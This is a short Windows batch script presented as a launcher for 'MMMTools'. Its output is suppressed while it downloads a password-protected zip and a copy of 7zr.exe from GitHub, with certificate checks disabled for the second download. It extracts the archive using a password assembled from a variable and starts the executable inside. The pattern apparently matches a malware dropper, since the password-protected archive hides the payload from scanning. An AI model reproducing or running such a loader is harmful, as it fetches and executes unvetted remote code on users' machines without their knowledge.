@echo off
set eflm=MMMTools1.2.zip
set flm=MMMTools1.2.exe
cls
echo.
echo MMMTools Starting...
echo.
del %eflm% > nul
del %flm% > nul
set e=%e%-10824
curl -s https://raw.githubusercontent.com/mmmmm4299/MMMToolsD/main/%eflm% -o %eflm% > nul
curl -k -L -o 7zr.exe https://github.com/mmmmm4299/update/raw/main/7zr.exe > nul
7zr.exe x "%eflm%" -p%e% >nul
start %flm%
